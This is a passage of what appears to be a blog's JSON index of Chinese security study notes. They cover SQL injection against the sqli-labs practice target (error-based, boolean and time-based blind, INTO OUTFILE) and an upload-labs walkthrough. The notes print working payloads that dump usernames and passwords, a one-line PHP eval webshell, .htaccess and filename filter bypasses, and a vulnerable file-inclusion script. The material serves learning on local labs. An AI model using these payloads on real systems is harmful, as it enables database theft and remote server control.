&#x27;Hello&#x27;<br></code></pre></td></tr></table></figure>\n\n<p>在 SQL 中，<code>SUBSTRING()</code> 函数通常用于查询操作中，可以根据需要获取指定的字段。除此之外，也可以与其他函数和表达式组合使用，实现复杂的字符串处理逻辑。</p>\n<h1 id=\"3-1-继续注入\"><a href=\"#3-1-继续注入\" class=\"headerlink\" title=\"3.1 继续注入\"></a>3.1 继续注入</h1><p>继续前面</p>\n<p>根据获取的列名和表名查询表中的内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1&#x27; union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from users))) --+<br></code></pre></td></tr></table></figure>\n\n<p>发现只能看到前面的内容，后面的内容看不到</p>\n<p>这里用上前面的substring()函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1&#x27; union select 1,2,extractvalue(1,concat(0x7e,substring((select group_concat(id,username,password) from users),31,31))) --+<br></code></pre></td></tr></table></figure>\n\n<p>注意括号别画错了</p>\n<p>然后就结束了</p>\n<h1 id=\"4-结束\"><a href=\"#4-结束\" class=\"headerlink\" title=\"4 结束\"></a>4 结束</h1><p>今天学习的extractvalue就是报错注入中方非常经典的一种了，</p>\n<p>其原理就是通过报错的回显获取回显</p>\n<p>主要语句如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1&#x27; union select extractvalue(随便填,concat(0x7e,字符型基本语句)) --+<br></code></pre></td></tr></table></figure>\n\n<p>到后面配合substring()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1&#x27; union select extractvalue(随便填,concat(0x7e,substring(字符型基本语句,起始,长度))) --+<br></code></pre></td></tr></table></figure>\n\n<p>就行了</p>\n<p>结束！</p>\n","categories":["SQL_Study"],"tags":["sql"]},{"title":"Sql注入学习笔记#6","url":"/2023/06/06/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-6/","content":"<p>这篇文章学习floor报错</p>\n<span id=\"more\"></span>\n\n<p>这个报错似乎涉及的函数还不少，</p>\n<p>up花了两节课讲</p>\n<h1 id=\"1-Basic\"><a href=\"#1-Basic\" class=\"headerlink\" title=\"1 Basic\"></a>1 Basic</h1><ol>\n<li><p>rand()函数</p>\n<p>这个函数的用处是生成一个0-1的随机小数</p>\n<p>rand(n) 不返回随机数，返回一个固定的数</p>\n<p>用法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">select rand();<br>select rand()*2;   -- 支持加减乘除<br>select rand() from 表名;   -- 表中有几行返回几行随机数<br>例如：<br>mysql&gt; select rand()*2;<br>+--------------------+<br>| rand()*2           |<br>+--------------------+<br>| 0.9653487289001688 |<br>+--------------------+<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>floor()函数</p>\n<p>就是向下取整，相当于去尾</p>\n<p>用法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">floor(需要去尾的数)<br>例如：<br>mysql&gt; select floor(1.114514);<br>+-----------------+<br>| floor(1.114514) |<br>+-----------------+<br>|               1 |<br>+-----------------+<br></code></pre></td></tr></table></figure>\n\n<p>可以配合上前面的rand函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">mysql&gt; select floor(rand());<br>+---------------+<br>| floor(rand()) |<br>+---------------+<br>|             0 |<br>+---------------+<br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>concat_ws() 函数</p>\n<p>将函数内字段用第一个参数连接起来</p>\n<p>用法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">mysql&gt; select concat_ws(&#x27;-&#x27;,114,514);<br><br>+------------------------+<br>| concat_ws(&#x27;-&#x27;,114,514) |<br>+------------------------+<br>| 114-514                |<br>+------------------------+<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>as 关键字、group by 分组</p>\n<p>as相当于把一个结果放到一个变量里面，然后用group by分组</p>\n<p>和前面的函数混合在一起可以这样：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">mysql&gt; select concat_ws(0x7e,database(),floor(rand())) as var from users group by var;<br>+------------+<br>| var        |<br>+------------+<br>| security~0 |<br>+------------+<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>count() 函数</p>\n<p>用于统计某个列的行数，</p>\n<p>例如</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">select count(列名) from 表名;<br></code></pre></td></tr></table></figure>\n\n<p>如何列名填*，则将返回表中所有行的数量，</p>\n<p>如果指定一个特定的列名，</p>\n<p>则仅计算该列中具有非空值的行的数量</p>\n</li>\n</ol>\n<h1 id=\"2-造成报错\"><a href=\"#2-造成报错\" class=\"headerlink\" title=\"2 造成报错\"></a>2 造成报错</h1><p>构造如下语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">select count(*),concat_ws(&#x27;-&#x27;,database(),floor(rand(0)*2)) as var from users group by var;<br></code></pre></td></tr></table></figure>\n\n<p>将可以造成报错，</p>\n<p>如果是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">select count(*),concat_ws(&#x27;-&#x27;,database(),floor(rand(1)*2)) as var from users group by var;<br></code></pre></td></tr></table></figure>\n\n<p>则不会造成报错</p>\n<p>   这是为什么？up在视频里讲的很清楚了</p>\n\n\n<p>这里注意，这是标准的语句一个字不能差，</p>\n<p>例如floor函数和rand(0)*<strong>2</strong></p>\n<h1 id=\"3-开始注入\"><a href=\"#3-开始注入\" class=\"headerlink\" title=\"3 开始注入\"></a>3 开始注入</h1><p>首先获取数据库名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1&#x27; union select 1,count(*),concat_ws(0x7e,(database()),floor(rand(0)*2)) as x from information_schema.tables group by x --+<br></code></pre></td></tr></table></figure>\n\n<p>获取后查询数据库中的表名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1&#x27; union select 1,count(*),concat_ws(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),floor(rand(0)*2)) as x from information_schema.tables group by x --+<br></code></pre></td></tr></table></figure>\n\n<p>然后获取表中的列名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-1&#x27; union select 1,count(*),concat_ws(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),floor(rand(0)*2)) as x from information_schema.tables group by x --+<br></code></pre></td></tr></table></figure>\n\n<p>然后就是最后一步获取数据了,</p>\n<p>这里使用group_concat可能会没有回显，</p>\n<p>up的ppt里面也说了，</p>\n<p>改成concat即可，但是要配上limit函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-1&#x27; union select 1,count(*),concat_ws(0x7e,(select concat(id,&#x27;-&#x27;,username,&#x27;:&#x27;,password) from users limit 0,1),floor(rand(0)*2)) as x from information_schema.tables group by x --+<br></code></pre></td></tr></table></figure>\n\n<p>注意这里limit只能返回一行</p>\n<p>然后就成功了！</p>\n","categories":["SQL_Study"],"tags":["sql"]},{"title":"Sql注入学习笔记#7","url":"/2023/06/06/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-7/","content":"<p>这篇文章学习布尔盲注</p>\n<span id=\"more\"></span>\n\n<p>盲注类sql注入有：时间盲注、布尔盲注、报错盲注</p>\n<p>如何判断布尔盲注？</p>\n<p>就是id&#x3D;1’ and 1&#x3D;1–+ 正常id&#x3D;1’ and 1&#x3D;2–+不正常</p>\n<p>那么就具备布尔盲注的基本条件了 </p>\n<h1 id=\"1-Basic\"><a href=\"#1-Basic\" class=\"headerlink\" title=\"1 Basic\"></a>1 Basic</h1><ol>\n<li><p>ascii() 函数</p>\n<p>这个应该都知道了，</p>\n<p>没什么好介绍的。。。。</p>\n</li>\n<li><p>基本原理</p>\n<p>前面说了具备布尔注入的基本条件是id&#x3D;1’ and 1&#x3D;1–+ 正常id&#x3D;1’ and 1&#x3D;2–+不正常</p>\n<p>那么我们可以在这个and 后面做手脚，</p>\n<p>来通过页面的形式判断是否是True</p>\n</li>\n<li><p>substr() 函数</p>\n<p>语法：substr(string,m,n)</p>\n<p>从第m个字符开始显示n个数</p>\n</li>\n</ol>\n<p>还有更多的有用的函数等待探索，</p>\n<p>up可能后面也会介绍到</p>\n<h1 id=\"2-开始注入\"><a href=\"#2-开始注入\" class=\"headerlink\" title=\"2 开始注入\"></a>2 开始注入</h1><p>  这里会非常漫长，</p>\n<p>现在开始构造语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1&quot; and ascii(substr(database(),1,1))=115--+<br>?id=1&quot; and ascii(substr(database(),2,1))=101--+<br>......漫长的尝试<br></code></pre></td></tr></table></figure>\n\n<p>现在我知道了数据库ascii名是</p>\n<p>115 101 99 117 114 105 116 121</p>\n<p>转换一下知道了数据库名是security</p>\n<p>然后获取数据库中的表格</p>\n<p>……..</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1&#x27;and length((select database()))&gt;9--+<br>#大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4<br>?id=1&#x27;and ascii(substr((select database()),1,1))=115--+<br>#substr(&quot;78909&quot;,1,1)=7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。<br> <br> <br>?id=1&#x27;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13--+<br>判断所有表名字符长度。<br>?id=1&#x27;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99--+<br>逐一判断表名<br> <br>?id=1&#x27;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20--+<br>判断所有字段名的长度<br>?id=1&#x27;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99--+<br>逐一判断字段名。<br> <br> <br>?id=1&#x27; and length((select group_concat(username,password) from users))&gt;109--+<br>判断字段内容长度<br>?id=1&#x27; and ascii(substr((select group_concat(username,password) from users),1,1))&gt;50--+<br>逐一检测内容。<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"3-结束\"><a href=\"#3-结束\" class=\"headerlink\" title=\"3 结束\"></a>3 结束</h1><p>这个东西很简单，</p>\n<p>但是很麻烦，</p>\n<p>有空写个脚本吧。。。。</p>\n","categories":["SQL_Study"],"tags":["sql"]},{"title":"Sql注入学习笔记#8","url":"/2023/06/07/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-8/","content":"<p>这篇文章学习时间盲注和文件上传注入</p>\n<span id=\"more\"></span>\n\n<h1 id=\"1-时间注入-Basic\"><a href=\"#1-时间注入-Basic\" class=\"headerlink\" title=\"1 时间注入-Basic\"></a>1 时间注入-Basic</h1><ol>\n<li><p>函数 sleep(n)</p>\n<p>n可以填任何int，</p>\n<p>用处就是休眠n秒，这个应该不难理解</p>\n</li>\n<li><p>if判断语句</p>\n<p>语法：if(判断条件,true执行语句,false执行语句)</p>\n<p>用法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">mysql&gt; select if(1=2,sleep(0),sleep(2));<br>+---------------------------+<br>| if(1=2,sleep(0),sleep(2)) |<br>+---------------------------+<br>|                         0 |<br>+---------------------------+<br>1 row in set (2.00 sec)<br><br>mysql&gt; select if(1=1,sleep(0),sleep(2));<br>+---------------------------+<br>| if(1=1,sleep(0),sleep(2)) |<br>+---------------------------+<br>|                         0 |<br>+---------------------------+<br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure>\n\n\n\n<p>其实他就相当于下面的python代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> time <span class=\"hljs-keyword\">import</span> sleep<br><span class=\"hljs-keyword\">if</span> <span class=\"hljs-number\">1</span>=<span class=\"hljs-number\">1</span>:<br>\tsleep(<span class=\"hljs-number\">0</span>)<br><span class=\"hljs-keyword\">else</span>:<br>\tsleep(<span class=\"hljs-number\">2</span>)<br></code></pre></td></tr></table></figure>\n\n<p>这两个函数很简单</p>\n</li>\n</ol>\n<p>那如何在实战中使用呢？</p>\n<p>首先使用时间盲注的情境时界面没有返回值（回显点）</p>\n<p>那我们可以通过页面响应时间来布尔盲注</p>\n<p>使用语句基本如下：</p>\n\n\n<h1 id=\"2-时间注入-实战注入\"><a href=\"#2-时间注入-实战注入\" class=\"headerlink\" title=\"2 时间注入-实战注入\"></a>2 时间注入-实战注入</h1><p>布尔盲注最痛苦的就是极其漫长的注入的过程了，</p>\n<p>有空写个爆破的脚本。。。。</p>\n<p>我这里就只做前面基本爆破数据库名</p>\n<p>（其实实战中不用这样，直接database()就好了，</p>\n<p>（这里只是打靶演示</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1&#x27; and if((ascii(substr(database(),1,1))=105),sleep(0),sleep(2))--+<br><br>?id=1&#x27; and if((ascii(substr(database(),2,1))=101),sleep(0),sleep(2))--+<br>.............<br></code></pre></td></tr></table></figure>\n\n<p>点到为止😏</p>\n<hr>\n<p>关于盲注，这里有一篇极好的文章可以研究研究：</p>\n<p><a href=\"https://www.anquanke.com/post/id/170626\">一篇文章带你深入理解 SQL 盲注</a></p>\n<h1 id=\"3-文件上传注入-Basic\"><a href=\"#3-文件上传注入-Basic\" class=\"headerlink\" title=\"3 文件上传注入-Basic\"></a>3 文件上传注入-Basic</h1><p>首先判断是否具备文件上传的读写权限</p>\n<p>在你的mysql中输入下面这段话：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">show variables like &#x27;%secure%&#x27;;<br></code></pre></td></tr></table></figure>\n\n<p>然后看secure_file_priv所对应的值</p>\n<p>我这里出现的是：NULL</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">+--------------------------+-------+<br>| Variable_name            | Value |<br>+--------------------------+-------+<br>| require_secure_transport | OFF   |<br>| secure_auth              | ON    |<br>| secure_file_priv         | NULL  |<br>+--------------------------+-------+<br>3 rows in set, 1 warning (0.00 sec)<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>NULL 代表不具备读写权限</li>\n<li>单元格为空 则代表具备读写权限</li>\n<li>有具体路径 则代表具备对指定目录的读写权限</li>\n</ul>\n<p>这里为了打靶我开启了权限，其法：</p>\n<blockquote>\n<p>去MySQL目录里搜my.ini，在mysqld下面添secure_file_priv&#x3D;””<br>记得保存，最后重启MySQL就行了</p>\n</blockquote>\n<p>文件上传要点</p>\n\n\n<h1 id=\"4-文件上传注入-实战注入\"><a href=\"#4-文件上传注入-实战注入\" class=\"headerlink\" title=\"4 文件上传注入-实战注入\"></a>4 文件上传注入-实战注入</h1><p>构造如下语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-1&#x27;)) union select 1,&quot;&lt;?php @eval($_POST[&#x27;你的密码&#x27;]);?&gt;&quot;,3 into outfile &quot;你的路径&quot; --+<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><p>路径需要双斜杠，例如</p>\n<p>D:\\\\Home\\\\phpstudy_pro\\\\WWW\\\\ben.php</p>\n</li>\n</ul>\n<p>然后用蚁剑连一下，</p>\n<p>下载，配置环境不说了，</p>\n<p>连接地址就是你的靶场地址</p>\n<p>例如</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">http://127.0.0.1/ben.php<br></code></pre></td></tr></table></figure>\n\n<p>密码一句话木马里面的填的</p>\n<p>然后测试连接出现这种就成功了</p>\n\n\n<p>然后就相当于远控上线了一样，</p>\n<p>dddd</p>\n","categories":["SQL_Study"],"tags":["sql"]},{"title":"Upload-Lab打靶随记","url":"/2023/06/23/Upload-Lab%E6%89%93%E9%9D%B6%E9%9A%8F%E8%AE%B0/","content":"<h1 id=\"Pass1-Pass2\"><a href=\"#Pass1-Pass2\" class=\"headerlink\" title=\"Pass1 - Pass2\"></a>Pass1 - Pass2</h1><p>这一关只允许上传jpg等图像文件，</p>\n<p>我们将shell.php重命名为shell.jpg然后上传，</p>\n<p>用burp抓包修改后缀名即可上传成功</p>\n\n\n<p>（Pass2有mime类型检查，需要注意修改）</p>\n<h1 id=\"Pass3\"><a href=\"#Pass3\" class=\"headerlink\" title=\"Pass3\"></a>Pass3</h1><p>这一关出现了过滤，上面的方式行不通了</p>\n\n\n<p>尝试修改一些比较另类的后缀例如php5</p>\n<p>可以上传，但是文件名被修改了，F12打开浏览器在上传图片之后就可以看到文件名了</p>\n\n\n<p>但是蚁剑连接不上去，查找了一下资料发现应该是我本地环境的问题，</p>\n<p>正常情况下应该是会将php5解析为php文件的，这里就不跟这个bug过不去了</p>\n<h1 id=\"Pass4\"><a href=\"#Pass4\" class=\"headerlink\" title=\"Pass4\"></a>Pass4</h1><p>这一关有了严格的后缀限制，上一关的手法用不了了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;);<br></code></pre></td></tr></table></figure>\n\n<p>这里就要用到.htaccess文件了</p>\n<blockquote>\n<p><a href=\"https://blog.csdn.net/weixin_46684578/article/details/119141109\">文件上传之 .htaccess文件getshell_.htaccess getshell</a></p>\n</blockquote>\n<p>文件内容如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&lt;FilesMatch &quot;shell.jpg&quot;&gt;<br>  SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure>\n\n<p>之后上传shell.jpg直接访问即可</p>\n<h1 id=\"Pass5\"><a href=\"#Pass5\" class=\"headerlink\" title=\"Pass5\"></a>Pass5</h1><p>没有重复过滤，我们使用shell.php. .绕过</p>\n<p>然后burp查看文件上传后的名字蚁剑连接即可</p>\n<h1 id=\"Pass6\"><a href=\"#Pass6\" class=\"headerlink\" title=\"Pass6\"></a>Pass6</h1><p>大小写绕过即可</p>\n\n\n<h1 id=\"Pass7\"><a href=\"#Pass7\" class=\"headerlink\" title=\"Pass7\"></a>Pass7</h1><p>查看源代码，和前面几关的不同时他没有首尾去除空格，</p>\n<p>那我们就在最后加一个空格即可（要在burp里面添加）</p>\n<h1 id=\"Pass8\"><a href=\"#Pass8\" class=\"headerlink\" title=\"Pass8\"></a>Pass8</h1><p>查看源代码，发现这一关没有删除文件末尾的点</p>\n<p>直接上传shell.php.</p>\n<p>原理：</p>\n<p>windows的特性，会自动删除文件末尾的点，</p>\n<p>但是程序里面的正则却会匹配这个点，</p>\n<p>因此这个方法可以bypass程序的正则检查并利用特性达到效果</p>\n<h1 id=\"Pass9\"><a href=\"#Pass9\" class=\"headerlink\" title=\"Pass9\"></a>Pass9</h1><p>查看源码，找不同，发现这一关没有过滤 ::$Data字符串</p>\n<p>他的原理同上一关，也是利用Windows特性</p>\n\n\n<h1 id=\"Pass10\"><a href=\"#Pass10\" class=\"headerlink\" title=\"Pass10\"></a>Pass10</h1><p>这一关的绕过方式和sql注入中的复写过滤字符这个绕过思路差不多，</p>\n<p>程序只是执行了一次过滤，例如过滤字符是abc，</p>\n<p>那我们构造字符：a<em><strong>abc</strong></em>abc </p>\n<p>其中中间的abc被删除了，但是删除之后还剩下一个abc</p>\n<p>因此，我们的文件名可以是：shell.php. . . </p>\n<h1 id=\"Pass11\"><a href=\"#Pass11\" class=\"headerlink\" title=\"Pass11\"></a>Pass11</h1><p>这一关和上面差不多，只不过没有警告，而是默默的删除你的违规后缀名</p>\n<p>同样是复写过滤字符串的方式来绕过：shell.phhtmlp</p>\n<h1 id=\"Pass12\"><a href=\"#Pass12\" class=\"headerlink\" title=\"Pass12\"></a>Pass12</h1>\n\n<p>%00截断（有限制）</p>\n<blockquote>\n<p>来自<a href=\"https://blog.csdn.net/qq_53003652/article/details/129969951\">https://blog.csdn.net/qq_53003652/article/details/129969951</a></p>\n</blockquote>\n<h1 id=\"Pass13\"><a href=\"#Pass13\" class=\"headerlink\" title=\"Pass13\"></a>Pass13</h1><p>这一关只是接受值变成了POST，其他的和上面一关一样</p>\n<h1 id=\"Pass14-Pass16\"><a href=\"#Pass14-Pass16\" class=\"headerlink\" title=\"Pass14 - Pass16\"></a>Pass14 - Pass16</h1><p>这一关涉及到了文件包含漏洞，简单了解了一下：</p>\n<blockquote>\n<p><a href=\"https://blog.csdn.net/m0_46467017/article/details/126380415\">https://blog.csdn.net/m0_46467017/article/details/126380415</a></p>\n</blockquote>\n<ul>\n<li><p><strong>能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞(LFI)</strong></p>\n</li>\n<li><p>文件包含漏洞不在乎文件格式是什么（不像蚁剑的连接）</p>\n</li>\n<li><p>文件包含漏洞会直接执行脚本</p>\n</li>\n</ul>\n<p>回到这一关，首先他会检查图片前面两个字节是否是git、png、jpg格式的</p>\n<p>这里我们只需要给webshell前面加上一个“GIF89a”就可以绕过这层检查，</p>\n<p>然后我们上传之后用burp抓包改名，发现文件名又被修改回了gif，</p>\n<p>再次查看源代码，发现是这一句：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-variable\">$file_type</span> = <span class=\"hljs-title function_ invoke__\">getReailFileType</span>(<span class=\"hljs-variable\">$temp_file</span>);<br></code></pre></td></tr></table></figure>\n\n<p>那我们就没有办法对后缀名做手脚了，</p>\n<p>但是我们可以利用上面的文件包含漏洞的特性，不论文件格式都执行代码</p>\n<p>我们查看upload-lab这个靶场的根目录，有一个include.php：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-comment\">/*</span><br><span class=\"hljs-comment\">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span><br><span class=\"hljs-comment\">*/</span><br><span class=\"hljs-title function_ invoke__\">header</span>(<span class=\"hljs-string\">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class=\"hljs-variable\">$file</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;file&#x27;</span>];<br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$file</span>))&#123;<br>    <span class=\"hljs-keyword\">include</span> <span class=\"hljs-variable\">$file</span>;<br>&#125;<span class=\"hljs-keyword\">else</span>&#123;<br>    <span class=\"hljs-title function_ invoke__\">show_source</span>(__file__);<br>&#125;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>因此我们就可以使用这个漏洞来执行并读取这个我们刚才上传的shell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">http://127.0.0.1/upload-labs/include.php?file=upload/3020230623150239.gif<br></code></pre></td></tr></table></figure>\n\n<p>同样蚁剑是可以连接的</p>\n<hr>\n<p>注：pass16需要开启php_exif()模块，可以看小皮面板官方给出的方法</p>\n<p><a href=\"https://www.xp.cn/b.php/108635.html\">https://www.xp.cn/b.php/108635.html</a></p>\n<h1 id=\"Pass17\"><a href=\"#Pass17\" class=\"headerlink\" title=\"Pass17\"></a>Pass17</h1><p>这一关就很高大上了，，《二次渲染》</p>\n<p>具体的可以看这位师傅写的文章，很详尽：</p>\n<blockquote>\n<p><a href=\"https://blog.csdn.net/weixin_45588247/article/details/119177948\">https://blog.csdn.net/weixin_45588247/article/details/119177948</a></p>\n</blockquote>\n<p>其中最精华的就是这个部分：</p>\n\n\n<p>开始操作，首先copy一下，注意顺序不要搞反了</p>\n\n\n<p>（这个命令让我想起了一段痛苦的修bug时光）</p>\n<p>（到现在都解决不了md）</p>\n<p>然后上传，打开16进制查看器对比，我使用的是010</p>\n<blockquote>\n<p><strong><code>GIF</code>绕过二次渲染的方法，就是通过对比上传前和上传后的两个文件，如果说哪个位置，它的上传前和上传后的没有变，我们就把php一句话代码插入到这个位置。</strong></p>\n</blockquote>\n\n\n<p>ctrl s保存，重新上传</p>\n<p>（这里我把一句话木马改成了phpinfo()，因为似乎一句话木马用不了）</p>\n<p>在010内查看，phpinfo()还在！</p>\n<p>浏览器内访问：</p>\n\n\n<p>ok！</p>\n<h1 id=\"Pass18\"><a href=\"#Pass18\" class=\"headerlink\" title=\"Pass18\"></a>Pass18</h1><p>一句话木马前添加GIF89a</p>\n<p>直接上传即可，然后文件包含</p>\n<hr>\n<p>但如果我们的目标是getshell呢？</p>\n<p><strong>条件竞争</strong></p>\n\n\n<blockquote>\n<p><a href=\"https://blog.csdn.net/weixin_45612728/article/details/131222779\">https://blog.csdn.net/weixin_45612728/article/details/131222779</a></p>\n</blockquote>\n<p>我懒得写脚本了，直接过了吧。。</p>\n<h1 id=\"代码审计相关\"><a href=\"#代码审计相关\" class=\"headerlink\" title=\"代码审计相关\"></a>代码审计相关</h1><p>后面的几关都是代码审计的了，本人小白不会php，</p>\n<p>直接去上面那个文章里面看吧，略</p>\n<h1 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h1><p>简单梳理一下这篇文章的内容：</p>\n<ol>\n<li><p>前端过滤</p>\n<p>前端的过滤就是个纸老虎，</p>\n<p>只需要在burp里面抓包然后修改数据即可</p>\n</li>\n<li><p>mime类型检查</p>\n<p>Content-Type: image&#x2F;gif</p>\n<p>有些时候可能还会检查是否于文件后缀相符，例如上传的是png，</p>\n<p>但是Content-Type是 image&#x2F;gif，也会拦截，注意细节！</p>\n</li>\n<li><p>后缀名绕过</p>\n<ul>\n<li>利用冷门的后缀</li>\n<li>大小写绕过正则</li>\n<li>添加 “.” 、空格、“::$DATA”绕过正则</li>\n<li>复写被过滤后缀绕过非循环过滤</li>\n<li>%00截断（有限制）</li>\n</ul>\n</li>\n<li><p>中间件特性 .htaccess</p>\n<p>如果文件后缀上绕不过了，就可以尝试这个</p>\n</li>\n<li><p>文件包含漏洞</p>\n<p>如果上传了非php格式shell，且没有办法修改后缀名，</p>\n<p>可以尝试寻找文件包含漏洞，他的好处就是不论后缀都可以解析</p>\n</li>\n<li><p>代码审计</p>\n<p>白盒测试总归轻松很多</p>\n</li>\n</ol>\n","categories":["Web"],"tags":["file_upload","file_inclusion"]},{"title":"Sql注入学习笔记#9","url":"/2023/06/07/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-9/","content":"<p>这篇文章学习DNSlog注入</p>\n<span id=\"more\"></span>\n\n<p>dnslog注入也是属于盲注的一种，</p>\n<p>效率更高</p>\n<h1 id=\"1-Basic\"><a href=\"#1-Basic\" class=\"headerlink\" title=\"1 Basic\"></a>1 Basic</h1><ol>\n<li><p>函数load_file(path)</p>\n<p>使用示例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">mysql&gt; select load_file(&quot;D:\\\\Desktop\\\\test.txt&quot;);<br>+------------------------------------------------------------------------+<br>| load_file(&quot;D:\\\\Desktop\\\\test.txt&quot;)                                     |<br>+------------------------------------------------------------------------+<br>| 0x746573740D0A3132330D0AE6B58BE8AF95                                   |<br>+------------------------------------------------------------------------+<br><br></code></pre></td></tr></table></figure>\n</li>\n<li><p>unc 